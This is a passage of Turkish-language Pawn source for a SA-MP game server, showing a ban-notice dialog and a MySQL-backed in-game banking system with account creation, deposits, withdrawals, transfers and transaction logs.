			format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Sebep);
			format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}Yok\n", Yazi);
			format(Yazi, 1000, "%s\n", Yazi);
			format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
			format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de þikayette bulunabilirsiniz.\n", Yazi);
			format(Yazi, 1000, "%s\n", Yazi);
    		format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    		ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Týrcýlar Mekaný Yönetim", Yazi, "Kapat", "");

    		//format(Yazi, 1000, "{FF4040}%s {F8F8FF}yasaklý olduðu için sunucudan atýldý.", GetName(playerid));
    		//SendClientMessageToAll(-1, Yazi);
    		CikisYazdir[playerid] = false;

    		SafeKick(playerid);
    		return 1;
		}
    }
	return 0;
}

// UnBan
UnBan(iPlayerName[])
{
	return SQL::DeleteRowEx("yasaklilar", "Nick", iPlayerName);
}

// ************************************************************************************************************************************************************
// Banka Sistemi [ Yapýmcý:rootcause(Forum SA:MP) ]
// ************************************************************************************************************************************************************
formatInt(intVariable, iThousandSeparator = ',', iCurrencyChar = '$')
{
    /*
		By Kar
		https://gist.github.com/Kar2k/bfb0eafb2caf71a1237b349684e091b9/8849dad7baa863afb1048f40badd103567c005a5#file-formatint-function
	*/
	static
		s_szReturn[ 32 ],
		s_szThousandSeparator[ 2 ] = { ' ', EOS },
		s_szCurrencyChar[ 2 ] = { ' ', EOS },
		s_iVariableLen,
		s_iChar,
		s_iSepPos,
		bool:s_isNegative
	;

	format( s_szReturn, sizeof( s_szReturn ), "%d", intVariable );

	if(s_szReturn[0] == '-')
		s_isNegative = true;
	else
		s_isNegative = false;

	s_iVariableLen = strlen( s_szReturn );

	if ( s_iVariableLen >= 4 && iThousandSeparator)
	{
		s_szThousandSeparator[ 0 ] = iThousandSeparator;

		s_iChar = s_iVariableLen;
		s_iSepPos = 0;

		while ( --s_iChar > _:s_isNegative )
		{
			if ( ++s_iSepPos == 3 )
			{
				strins( s_szReturn, s_szThousandSeparator, s_iChar );

				s_iSepPos = 0;
			}
		}
	}
	if(iCurrencyChar) {
		s_szCurrencyChar[ 0 ] = iCurrencyChar;
		strins( s_szReturn, s_szCurrencyChar, _:s_isNegative );
	}
	return s_szReturn;
}

Bank_SaveLog(playerid, type, accid, toaccid, amount)
{
	if(type == TYPE_NONE) return 1;
	new query[256];

	switch(type)
	{
	    case TYPE_LOGIN, TYPE_PASSCHANGE: mysql_format(BankSQLHandle, query, sizeof(query), "INSERT INTO bank_logs SET AccountID=%d, Type=%d, Player='%e', Date=UNIX_TIMESTAMP()", accid, type, GetName(playerid));
	    case TYPE_DEPOSIT, TYPE_WITHDRAW: mysql_format(BankSQLHandle, query, sizeof(query), "INSERT INTO bank_logs SET AccountID=%d, Type=%d, Player='%e', Amount=%d, Date=UNIX_TIMESTAMP()", accid, type, GetName(playerid), amount);
		case TYPE_TRANSFER: mysql_format(BankSQLHandle, query, sizeof(query), "INSERT INTO bank_logs SET AccountID=%d, ToAccountID=%d, Type=%d, Player='%e', Amount=%d, Date=UNIX_TIMESTAMP()", accid, toaccid, type, GetName(playerid), amount);
	}

	mysql_tquery(BankSQLHandle, query);
	return 1;
}

Bank_ShowMenu(playerid)
{
	new string[256];
	if(CurrentAccountID[playerid] == -1) {
		format(string, sizeof(string), "{FFCC00}» {FFFFFF}Hesap Oluþtur\t{2ECC71}%d$\nHesaplarým\t{F1C40F}%d", ACCOUNT_PRICE, Bank_AccountCount(playerid));
		ShowPlayerDialog(playerid, DIALOG_BANK_MENU_NOLOGIN, DIALOG_STYLE_TABLIST, "{F1C40F}Banka: {FFFFFF}Menü", string, "Seç", "Kapat");
	}else{
	    new balance = Bank_GetBalance(CurrentAccountID[playerid]), menu_title[64];
		format(menu_title, sizeof(menu_title), "{F1C40F}Banka: {FFFFFF}Menü (Hesap No: {F1C40F}%d{FFFFFF})", CurrentAccountID[playerid]);

	    format(
			string,
			sizeof(string),
			"{FFCC00}» {FFFFFF}Hesap Oluþtur\t{2ECC71}%d$\nHesaplarým\t{F1C40F}%d\nPara Yatýr\t{2ECC71}%s\nPara Çek\t{2ECC71}%s\nTransfer Yap\t{2ECC71}%s\n{ADFF2F}Hesap Kayýtlarý\n{ADFF2F}Þifre Deðiþtir\n{ADFF2F}Hesabý Sil\nHesaptan Çýkýþ",
			ACCOUNT_PRICE,
			Bank_AccountCount(playerid),
			formatInt(GetPlayerMoney(playerid)),
			formatInt(balance),
			formatInt(balance)
		);

		ShowPlayerDialog(playerid, DIALOG_BANK_MENU, DIALOG_STYLE_TABLIST, menu_title, string, "Seç", "Kapat");
	}

	DeletePVar(playerid, "bankLoginAccount");
	DeletePVar(playerid, "bankTransferAccount");
	return 1;
}

Bank_ShowLogMenu(playerid)
{
	LogListType[playerid] = TYPE_NONE;
	LogListPage[playerid] = 0;
	ShowPlayerDialog(playerid, DIALOG_BANK_LOGS, DIALOG_STYLE_LIST, "{F1C40F}Banka: {FFFFFF}Kayýtlar", "Yatýrýlan Para\nÇekilen Para\nTransfer\nGiriþ Sayýsý\nÞifre Deðiþim Sayýsý", "Göster", "Geri");
	return 1;
}
/*
GetName(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, MAX_PLAYER_NAME);
	return name;
}
*/
Bank_AccountCount(playerid)
{
	new query[144], Cache: find_accounts;
	mysql_format(BankSQLHandle, query, sizeof(query), "SELECT null FROM bank_accounts WHERE Owner='%e' && Disabled=0", GetName(playerid));
	find_accounts = mysql_query(BankSQLHandle, query);

	new count = cache_num_rows();
	cache_delete(find_accounts);
	return count;
}

Bank_GetBalance(accountid)
{
	new query[144], Cache: get_balance;
	mysql_format(BankSQLHandle, query, sizeof(query), "SELECT Balance FROM bank_accounts WHERE ID=%d && Disabled=0", accountid);
	get_balance = mysql_query(BankSQLHandle, query);

	new balance;
	cache_get_value_name_int(0, "Balance", balance);
	cache_delete(get_balance);
	return balance;
}

Bank_GetOwner(accountid)
{
	new query[144], owner[MAX_PLAYER_NAME], Cache: get_owner;
	mysql_format(BankSQLHandle, query, sizeof(query), "SELECT Owner FROM bank_accounts WHERE ID=%d && Disabled=0", accountid);
	get_owner = mysql_query(BankSQLHandle, query);

	cache_get_value_name(0, "Owner", owner);
	cache_delete(get_owner);
	return owner;
}

Bank_ListAccounts(playerid)
{
    new query[256], Cache: get_accounts;
    mysql_format(BankSQLHandle, query, sizeof(query), "SELECT ID, Balance, LastAccess, FROM_UNIXTIME(CreatedOn, '%%d/%%m/%%Y %%H:%%i:%%s') AS Created, FROM_UNIXTIME(LastAccess, '%%d/%%m/%%Y %%H:%%i:%%s') AS Last FROM bank_accounts WHERE Owner='%e' && Disabled=0 ORDER BY CreatedOn DESC", GetName(playerid));
	get_accounts = mysql_query(BankSQLHandle, query);
    new rows = cache_num_rows();

	if(rows) {
	    new string[1024], cdate[24], ldate[24], cid, cbalance, lastaccess;
    	format(string, sizeof(string), "Hesap No\tPara\tOluþturulma Tarihi\tSon Eriþim\n");
	    for(new i; i < rows; ++i)
	    {
        	cache_get_value_name(i, "Created", cdate);
        	cache_get_value_name(i, "Last", ldate);
        	cache_get_value_name_int(i, "ID", cid);
        	cache_get_value_name_int(i, "Balance", cbalance);
        	cache_get_value_name_int(i, "LastAccess", lastaccess);
	        format(string, sizeof(string), "%s{FFFFFF}%d\t{2ECC71}%s\t{FFFFFF}%s\t%s\n", string, cid, formatInt(cbalance), cdate, (lastaccess == 0) ? ("Yok") : ldate);
	    }

		ShowPlayerDialog(playerid, DIALOG_BANK_ACCOUNTS, DIALOG_STYLE_TABLIST_HEADERS, "{F1C40F}Banka: {FFFFFF}Hesaplarým", string, "Giriþ", "Geri");
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Banka hesabýnýz bulunmamakta!.");
		Bank_ShowMenu(playerid);
	}

    cache_delete(get_accounts);
	return 1;
}

Bank_ShowLogs(playerid)
{
	new query[196], type = LogListType[playerid], Cache: bank_logs;
	mysql_format(BankSQLHandle, query, sizeof(query), "SELECT *, FROM_UNIXTIME(Date, '%%d/%%m/%%Y %%H:%%i:%%s') as ActionDate FROM bank_logs WHERE AccountID=%d && Type=%d ORDER BY Date DESC LIMIT %d, 15", CurrentAccountID[playerid], type, LogListPage[playerid] * 15);
	bank_logs = mysql_query(BankSQLHandle, query);

	new rows = cache_num_rows();
	if(rows) {
		new list[1512], title[96], name[MAX_PLAYER_NAME], date[24], amountt, toaccount;
		switch(type)
		{
		    case TYPE_LOGIN:
			{
				format(list, sizeof(list), "Ýþlemi Yapan\tÝþlem Tarihi\n");
				format(title, sizeof(title), "{F1C40F}Banka: {FFFFFF}Hesaba Giriþ Geçmiþi (Sayfa %d)", LogListPage[playerid] + 1);
			}

			case TYPE_DEPOSIT:
			{
				format(list, sizeof(list), "Ýþlemi Yapan\tMiktar\tÝþlem Tarihi\n");
				format(title, sizeof(title), "{F1C40F}Banka: {FFFFFF}Para Yatýrma Geçmiþi (Sayfa %d)", LogListPage[playerid] + 1);
			}

			case TYPE_WITHDRAW:
			{
				format(list, sizeof(list), "Ýþlemi Yapan\tMiktar\tÝþlem Tarihi\n");
				format(title, sizeof(title), "{F1C40F}Banka: {FFFFFF}Para Çekme Geçmiþi (Sayfa %d)", LogListPage[playerid] + 1);
			}

			case TYPE_TRANSFER:
			{
				format(list, sizeof(list), "Ýþlemi Yapan\tGönderilen Hesap\tMiktar\tÝþlem Tarihi\n");
				format(title, sizeof(title), "{F1C40F}Banka: {FFFFFF}Para Transferi Geçmiþi (Sayfa %d)", LogListPage[playerid] + 1);
			}

			case TYPE_PASSCHANGE:
			{
				format(list, sizeof(list), "Ýþlemi Yapan\tÝþlem Tarihi\n");
				format(title, sizeof(title), "{F1C40F}Banka: {FFFFFF}Þifre Deðiþimleri (Sayfa %d)", LogListPage[playerid] + 1);
			}
		}

	    for(new i; i < rows; ++i)
	    {
	        cache_get_value_name(i, "Player", name);
        	cache_get_value_name(i, "ActionDate", date);
        	cache_get_value_name_int(i, "Amount", amountt);
        	cache_get_value_name_int(i, "ToAccountID", toaccount);

            switch(type)
			{
			    case TYPE_LOGIN:
				{
					format(list, sizeof(list), "%s%s\t%s\n", list, name, date);
				}

				case TYPE_DEPOSIT:
				{
					format(list, sizeof(list), "%s%s\t{2ECC71}%s\t%s\n", list, name, formatInt(amountt), date);
				}

				case TYPE_WITHDRAW:
				{
					format(list, sizeof(list), "%s%s\t{2ECC71}%s\t%s\n", list, name, formatInt(amountt), date);
				}

				case TYPE_TRANSFER:
				{
					format(list, sizeof(list), "%s%s\t%d\t{2ECC71}%s\t%s\n", list, name, toaccount, formatInt(amountt), date);
				}

				case TYPE_PASSCHANGE:
				{
					format(list, sizeof(list), "%s%s\t%s\n", list, name, date);
				}
			}
	    }

		ShowPlayerDialog(playerid, DIALOG_BANK_LOG_PAGE, DIALOG_STYLE_TABLIST_HEADERS, title, list, "Sonraki", "Geri");
	}else{
		SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Hesap geçmiþi kaydý bulunamadý.");
		Bank_ShowLogMenu(playerid);
	}

	cache_delete(bank_logs);
	return 1;
}

forward BankaDialogs(playerid, dialogid, response, listitem, inputtext[]);
public BankaDialogs(playerid, dialogid, response, listitem, inputtext[])
{
	switch(dialogid)
	{
	    /* ---------------------------------------------------------------------- */
	    case DIALOG_BANK_MENU_NOLOGIN:
	    {
	        if(!response) return 1;
	        if(listitem == 0)
	        {
	            if(ACCOUNT_PRICE > APlayerData[playerid][PlayerMoney])
	            {
	                SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Banka hesabý açmak için yeterince paranýz yok!");
	                return Bank_ShowMenu(playerid);
	            }

				#if defined ACCOUNT_CLIMIT
				if(Bank_AccountCount(playerid) >= ACCOUNT_CLIMIT)
	            {
	                SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Banka hesabý açma limitini aþamazsýnýz!");
	                return Bank_ShowMenu(playerid);
	            }
				#endif

				ShowPlayerDialog(playerid, DIALOG_BANK_CREATE_ACCOUNT, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Hesap Oluþtur", "Banka hesabý oluþturmak için þifre seçin:", "Oluþtur", "Geri");
	        }

	        if(listitem == 1) Bank_ListAccounts(playerid);
	        if(listitem == 2) ShowPlayerDialog(playerid, DIALOG_BANK_LOGIN_ID, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Giriþ", "Giriþ yapýlacak Hesap No:", "Devam", "Ýptal");
	        return 1;
	    }
     	/* ---------------------------------------------------------------------- */
     	case DIALOG_BANK_MENU:
		{
		    if(!response) return 1;
		    if(listitem == 0)
	        {
	            if(ACCOUNT_PRICE > APlayerData[playerid][PlayerMoney])
	            {
	                SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Banka hesabý açmak için yeterince paranýz yok!");
	                return Bank_ShowMenu(playerid);
	            }

				#if defined ACCOUNT_CLIMIT
				if(Bank_AccountCount(playerid) >= ACCOUNT_CLIMIT)
	            {
	                SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Banka hesabý açma limitini aþamazsýnýz!");
	                return Bank_ShowMenu(playerid);
	            }
				#endif

				ShowPlayerDialog(playerid, DIALOG_BANK_CREATE_ACCOUNT, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Hesap Oluþtur", "Banka hesabý oluþturmak için þifre seçin:", "Oluþtur", "Geri");
	        }

	        if(listitem == 1) Bank_ListAccounts(playerid);
	        if(listitem == 2) ShowPlayerDialog(playerid, DIALOG_BANK_DEPOSIT, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Yatýr", "Hesabýnýza yatýrmak istediðiniz para miktarýný yazýn:", "Yatýr", "Geri");
            if(listitem == 3) ShowPlayerDialog(playerid, DIALOG_BANK_WITHDRAW, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Çek", "Hesabýnýzdan çekmek istediðiniz para miktarýný yazýn:", "Çek", "Geri");
			if(listitem == 4) ShowPlayerDialog(playerid, DIALOG_BANK_TRANSFER_1, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Transferi", "Para transferi yapmak istediðiniz Banka Hesap No:", "Devam", "Geri");
            if(listitem == 5)
			{
				Bank_ShowLogMenu(playerid);
			}

			if(listitem == 6)
			{
				if(strcmp(Bank_GetOwner(CurrentAccountID[playerid]), GetName(playerid)))
				{
				    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Bunu sadece hesap sahibi yapabilir.");
				    return Bank_ShowMenu(playerid);
				}

				ShowPlayerDialog(playerid, DIALOG_BANK_PASSWORD, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Þifre Deðiþtir", "Yeni hesap þifrenizi yazýn:", "Deðiþtir", "Geri");
			}

			if(listitem == 7)
			{
			    if(strcmp(Bank_GetOwner(CurrentAccountID[playerid]), GetName(playerid)))
				{
				    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Bunu sadece hesap sahibi yapabilir.");
				    return Bank_ShowMenu(playerid);
				}

				ShowPlayerDialog(playerid, DIALOG_BANK_REMOVE, DIALOG_STYLE_MSGBOX, "{F1C40F}Banka: {FFFFFF}Hesabý Sil", "Bunu yapmak istediðinize emin misiniz? Hesabýnýz {E74C3C}kalýcý olarak silinecek.", "Evet", "Geri");
				// https://youtu.be/rcjpags7JT8 - because it doesn't get deleted actually
			}

			if(listitem == 8)
			{
			    SendClientMessage(playerid, 0x3498DBFF, "BANKA: {FFFFFF}Baþarýyla çýkýþ yapýldý.");

			    CurrentAccountID[playerid] = -1;
			    Bank_ShowMenu(playerid);
			}
		}
        /* ---------------------------------------------------------------------- */
	    case DIALOG_BANK_CREATE_ACCOUNT:
	    {
	        if(!response) return Bank_ShowMenu(playerid);
	        if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANK_CREATE_ACCOUNT, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Hesap Oluþtur", "{E74C3C}Hesap þifrenizi boþ býrakamazsýnýz!\n\n{FFFFFF}Banka hesabý oluþturmak için þifre seçin:", "Oluþtur", "Geri");
			if(strlen(inputtext) > 16) return ShowPlayerDialog(playerid, DIALOG_BANK_CREATE_ACCOUNT, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Hesap Oluþtur", "{E74C3C}Hesap þifreniz 16 haneden fazla olamaz!\n\n{FFFFFF}Banka hesabý oluþturmak için þifre seçin:", "Oluþtur", "Geri");
			if(ACCOUNT_PRICE > APlayerData[playerid][PlayerMoney])
            {
                SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Banka hesabý oluþturmak için yeterince paranýz yok!");
                return Bank_ShowMenu(playerid);
            }

			#if defined ACCOUNT_CLIMIT
			if(Bank_AccountCount(playerid) >= ACCOUNT_CLIMIT)
            {
                SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Banka hesabý oluþturma sýnýrýný aþamazsýnýz!");
                return Bank_ShowMenu(playerid);
            }
			#endif

			new query[144];
			mysql_format(BankSQLHandle, query, sizeof(query), "INSERT INTO bank_accounts SET Owner='%e', Password=md5('%e'), CreatedOn=UNIX_TIMESTAMP()", GetName(playerid), inputtext);
			mysql_tquery(BankSQLHandle, query, "OnBankAccountCreated", "is", playerid, inputtext);
	        return 1;
	    }
	    /* ---------------------------------------------------------------------- */
	    case DIALOG_BANK_ACCOUNTS:
	    {
            if(!response) return Bank_ShowMenu(playerid);

            SetPVarInt(playerid, "bankLoginAccount", strval(inputtext));
			ShowPlayerDialog(playerid, DIALOG_BANK_LOGIN_PASS, DIALOG_STYLE_PASSWORD, "{F1C40F}Banka: {FFFFFF}Hesaba Giriþ", "Hesap þifresini girin:", "Giriþ", "Ýptal");
	        return 1;
	    }
	    /* ---------------------------------------------------------------------- */
	    case DIALOG_BANK_LOGIN_ID:
	    {
	        if(!response) return Bank_ShowMenu(playerid);
	        if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANK_LOGIN_ID, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Hesaba Giriþ", "{E74C3C}Banka Hesap No'yu boþ býrakamazsýnýz!\n\n{FFFFFF}Giriþ yapmak istediðiniz Banka Hesap No'su:", "Devam", "Ýptal");

			SetPVarInt(playerid, "bankLoginAccount", strval(inputtext));
			ShowPlayerDialog(playerid, DIALOG_BANK_LOGIN_PASS, DIALOG_STYLE_PASSWORD, "{F1C40F}Banka: {FFFFFF}Hesaba Giriþ", "Hesap þifresini girin:", "Giriþ", "Ýptal");
			return 1;
	    }
	    /* ---------------------------------------------------------------------- */
	    case DIALOG_BANK_LOGIN_PASS:
	    {
	        if(!response) return Bank_ShowMenu(playerid);
	        if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANK_LOGIN_PASS, DIALOG_STYLE_PASSWORD, "{F1C40F}Banka: {FFFFFF}Hesaba Giriþ", "{E74C3C}Banka hesap þifresini boþ býrakamazsýnýz!\n\n{FFFFFF}Hesap þifresini girin:", "Giriþ", "Ýptal");

			new query[200], id = GetPVarInt(playerid, "bankLoginAccount");
			mysql_format(BankSQLHandle, query, sizeof(query), "SELECT Owner, LastAccess, FROM_UNIXTIME(LastAccess, '%%d/%%m/%%Y %%H:%%i:%%s') AS Last FROM bank_accounts WHERE ID=%d && Password=md5('%e') && Disabled=0 LIMIT 1", id, inputtext);
			mysql_tquery(BankSQLHandle, query, "OnBankAccountLogin", "ii", playerid, id);
			return 1;
	    }
	    /* ---------------------------------------------------------------------- */
	    case DIALOG_BANK_DEPOSIT:
	    {
			if(!response) return Bank_ShowMenu(playerid);
			if(CurrentAccountID[playerid] == -1) return 1;
     		if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANK_DEPOSIT, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Yatýr", "{E74C3C}Yatýracaðýnýz para miktarýný girmediniz!\n\n{FFFFFF}Hesaba yatýrmak istediðiniz para miktarýný girin:", "Yatýr", "Geri");
			new amount = strval(inputtext);
			if(amount < 0) return ShowPlayerDialog(playerid, DIALOG_BANK_DEPOSIT, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Yatýr", "{E74C3C}0'dan küçük deðer giremezsiniz!\n\n{FFFFFF}Hesaba yatýrmak istediðiniz para miktarýný girin:", "Yatýr", "Geri");
			if(amount > APlayerData[playerid][PlayerMoney]) return ShowPlayerDialog(playerid, DIALOG_BANK_DEPOSIT, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Yatýr", "{E74C3C}Elinizde bu kadar para yok!\n\n{FFFFFF}Hesaba yatýrmak istediðiniz para miktarýný girin:", "Yatýr", "Geri");
			if((amount + Bank_GetBalance(CurrentAccountID[playerid])) > ACCOUNT_LIMIT)
			{
   				SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Banka hesabýnýzda 800M'den fazla para bulunduramazsýnýz!");
			    return Bank_ShowMenu(playerid);
			}

			new query[96];
			mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Balance=Balance+%d WHERE ID=%d && Disabled=0", amount, CurrentAccountID[playerid]);
			mysql_tquery(BankSQLHandle, query, "OnBankAccountDeposit", "ii", playerid, amount);
			return 1;
		}
        /* ---------------------------------------------------------------------- */
        case DIALOG_BANK_WITHDRAW:
	    {
			if(!response) return Bank_ShowMenu(playerid);
			if(CurrentAccountID[playerid] == -1) return 1;
     		if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANK_WITHDRAW, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Çek", "{E74C3C}Çekmek istediðiniz para miktarýný girmediniz!\n\n{FFFFFF}Hesaptan çekmek istediðiniz para miktarýný girin:", "Çek", "Geri");
			new amount = strval(inputtext);
			if(amount < 0) return ShowPlayerDialog(playerid, DIALOG_BANK_WITHDRAW, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Çek", "{E74C3C}0'dan küçük deðer giremezsiniz!\n\n{FFFFFF}Hesaptan çekmek istediðiniz para miktarýný girin:", "Çek", "Geri");
			if(amount > Bank_GetBalance(CurrentAccountID[playerid])) return ShowPlayerDialog(playerid, DIALOG_BANK_WITHDRAW, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Çek", "{E74C3C}Banka hesabýnda bu kadar para yok!\n\n{FFFFFF}Hesaptan çekmek istediðiniz para miktarýný girin:", "Çek", "Geri");

			new query[96];
			mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Balance=Balance-%d WHERE ID=%d && Disabled=0", amount, CurrentAccountID[playerid]);
			mysql_tquery(BankSQLHandle, query, "OnBankAccountWithdraw", "ii", playerid, amount);
			return 1;
		}
        /* ---------------------------------------------------------------------- */
        case DIALOG_BANK_TRANSFER_1:
	    {
			if(!response) return Bank_ShowMenu(playerid);
			if(CurrentAccountID[playerid] == -1) return 1;
     		if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANK_TRANSFER_1, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Transferi", "{E74C3C}Transfer yapacaðýnýz Banka Hesap No'yu girmediniz!\n\n{FFFFFF}Para transferi yapacaðýnýz Banka Hesap No:", "Devam", "Geri");
            if(strval(inputtext) == CurrentAccountID[playerid]) return ShowPlayerDialog(playerid, DIALOG_BANK_TRANSFER_1, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Transferi", "{E74C3C}Ayný iki hesap arasýnda transfer yapamazsýnýz!\n\n{FFFFFF}Para transferi yapacaðýnýz Banka Hesap No:", "Devam", "Geri");
            SetPVarInt(playerid, "bankTransferAccount", strval(inputtext));
            ShowPlayerDialog(playerid, DIALOG_BANK_TRANSFER_2, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Transferi", "Transfer yapacaðýnýz para miktarýný girin:", "Transfer", "Geri");
            return 1;
		}
        /* ---------------------------------------------------------------------- */
        case DIALOG_BANK_TRANSFER_2:
        {
            if(!response) return ShowPlayerDialog(playerid, DIALOG_BANK_TRANSFER_1, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Transferi", "Transfer yapacaðýnýz Banka Hesap No:", "Devam", "Geri");
            if(CurrentAccountID[playerid] == -1) return 1;
			if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANK_TRANSFER_2, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Transferi", "{E74C3C}Göndereceðiniz para miktarýný girmediniz!\n\n{FFFFFF}Transfer yapacaðýnýz para miktarýný girin:", "Transfer", "Geri");
            new amount = strval(inputtext);
            if(amount < 0) return ShowPlayerDialog(playerid, DIALOG_BANK_TRANSFER_2, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Transferi", "{E74C3C}0'dan küçük deðer giremezsiniz!\n\n{FFFFFF}Transfer yapacaðýnýz para miktarýný girin:", "Transfer", "Geri");
            if(amount > Bank_GetBalance(CurrentAccountID[playerid])) return ShowPlayerDialog(playerid, DIALOG_BANK_TRANSFER_2, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Para Transferi", "{E74C3C}Hesapta bu kadar para yok!\n\n{FFFFFF}Transfer yapacaðýnýz para miktarýný girin:", "Transfer", "Geri");
			new id = GetPVarInt(playerid, "bankTransferAccount");
			if((amount + Bank_GetBalance(id)) > ACCOUNT_LIMIT)
			{
				SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Bu hesaba bu parayý göndermeniz limit aþýmýna neden oluyor!");
				return Bank_ShowMenu(playerid);
			}

			new query[96];
			mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Balance=Balance+%d WHERE ID=%d && Disabled=0", amount, id);
			mysql_tquery(BankSQLHandle, query, "OnBankAccountTransfer", "iii", playerid, id, amount);
            return 1;
        }
        /* ---------------------------------------------------------------------- */
        case DIALOG_BANK_PASSWORD:
        {
        	if(!response) return Bank_ShowMenu(playerid);
        	if(CurrentAccountID[playerid] == -1) return 1;
	        if(isnull(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANK_PASSWORD, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Þifre Deðiþtir", "{E74C3C}Hesap þifresini boþ býraktýnýz!\n\n{FFFFFF}Hesabýnýz için yeni þifre seçin:", "Deðiþtir", "Geri");
			if(strlen(inputtext) > 16) return ShowPlayerDialog(playerid, DIALOG_BANK_PASSWORD, DIALOG_STYLE_INPUT, "{F1C40F}Banka: {FFFFFF}Þifre Deðiþtir", "{E74C3C}Hesap þifresi 16 karakterden uzun olamaz!\n\n{FFFFFF}Hesabýnýz için yeni þifre seçin:", "Deðiþtir", "Geri");

			new query[128];
			mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Password=md5('%e') WHERE ID=%d && Disabled=0", inputtext, CurrentAccountID[playerid]);
			mysql_tquery(BankSQLHandle, query, "OnBankAccountPassChange", "is", playerid, inputtext);
	        return 1;
	    }
        /* ---------------------------------------------------------------------- */
        case DIALOG_BANK_REMOVE:
        {
            if(!response) return Bank_ShowMenu(playerid);
            if(CurrentAccountID[playerid] == -1) return 1;

            new query[96], amount = Bank_GetBalance(CurrentAccountID[playerid]);
			mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Disabled=1 WHERE ID=%d", CurrentAccountID[playerid]);
			mysql_tquery(BankSQLHandle, query, "OnBankAccountDeleted", "iii", playerid, CurrentAccountID[playerid], amount);
            return 1;
        }
        /* ---------------------------------------------------------------------- */
        case DIALOG_BANK_LOGS:
        {
            if(!response) return Bank_ShowMenu(playerid);
            if(CurrentAccountID[playerid] == -1) return 1;

            new typelist[6] = {TYPE_NONE, TYPE_DEPOSIT, TYPE_WITHDRAW, TYPE_TRANSFER, TYPE_LOGIN, TYPE_PASSCHANGE};
            LogListType[playerid] = typelist[listitem + 1];
            LogListPage[playerid] = 0;
            Bank_ShowLogs(playerid);
            return 1;
   		}
        /* ---------------------------------------------------------------------- */
        case DIALOG_BANK_LOG_PAGE:
		{
		    if(CurrentAccountID[playerid] == -1 || LogListType[playerid] == TYPE_NONE) return 1;
			if(!response) {
			    LogListPage[playerid]--;
			    if(LogListPage[playerid] < 0) return Bank_ShowLogMenu(playerid);
			}else{
			    LogListPage[playerid]++;
			}

			Bank_ShowLogs(playerid);
		    return 1;
		}
        /* ---------------------------------------------------------------------- */
	}

	return 0;
}

forward OnBankAccountCreated(playerid, pass[]);
public OnBankAccountCreated(playerid, pass[])
{
	ParaVer(playerid, -ACCOUNT_PRICE);

	new id = cache_insert_id(), string[64];
	SendClientMessage(playerid, 0x3498DBFF, "BANKA: {FFFFFF}Baþarýyla hesap oluþturdunuz!");

	format(string, sizeof(string), "BANKA: {FFFFFF}Hesap No'nuz: {F1C40F}%d", id);
	SendClientMessage(playerid, 0x3498DBFF, string);

	format(string, sizeof(string), "BANKA: {FFFFFF}Hesap Þifreniz: {F1C40F}%s", pass);
	SendClientMessage(playerid, 0x3498DBFF, string);

	new Yazi[300];
